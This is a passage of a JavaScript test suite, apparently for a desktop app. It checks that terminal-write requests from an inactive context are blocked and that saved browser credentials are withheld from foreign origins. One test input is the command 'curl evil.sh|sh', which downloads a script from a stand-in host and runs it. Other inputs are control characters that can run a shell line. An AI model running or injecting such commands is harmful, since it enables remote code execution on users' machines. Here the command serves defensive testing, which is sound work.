  it('still forwards a genuine OSC or DCS reply', () => {
    const { on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    // Real bodies are printable and terminated by BEL or ST.
    const replies = [`${ESC}]11;rgb:00/00/00${BEL}`, `${ESC}P1$r0m${ESC}\\`, `${ESC}[M !!`]
    for (const reply of replies) {
      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
      expect(write).toHaveBeenCalledWith('chat-a', 't1', reply)
    }
    expect(write).toHaveBeenCalledTimes(replies.length)
  })

  it('gates every keystroke-shaped payload, not just newline-bearing ones', () => {
    const { on } = collectHandlers()
    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})

    // Enumerating "what submits" would have missed these: EOT hands a partial
    // line to a canonical-mode reader, and 0x0f executes the current line in
    // both bash and zsh. The allowlist runs the other way, so they are gated.
    for (const payload of ['ls', '\u0004', '\u000f', 'curl evil.sh|sh\r']) {
      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload, 'chat-a')
    }
    expect(write).not.toHaveBeenCalled()

    on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r', 'chat-a')
    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'ls\r')
  })

  it('defaults password conflicts to keeping what is already stored', async () => {
    const { invoke } = collectHandlers()

    await invoke.get('browser-credentials:import')?.(activeAppEvent, undefined, 'nonsense')
    expect(importChromePasswords).toHaveBeenCalledWith(undefined, 'keep-existing')
  })

  it('reports credential availability only to the app origin', async () => {
    const { invoke } = collectHandlers()
    const handler = invoke.get('browser-credentials:available')

    expect(await handler?.(evilEvent)).toBe(false)
    expect(credentialsAvailable).not.toHaveBeenCalled()
    expect(await handler?.(appEvent)).toBe(true)
  })

  it('never lists credentials to a foreign origin', async () => {
    const { invoke } = collectHandlers()

    expect(await invoke.get('browser-credentials:list')?.(evilEvent)).toEqual([])
    expect(listCredentials).not.toHaveBeenCalled()
  })
})
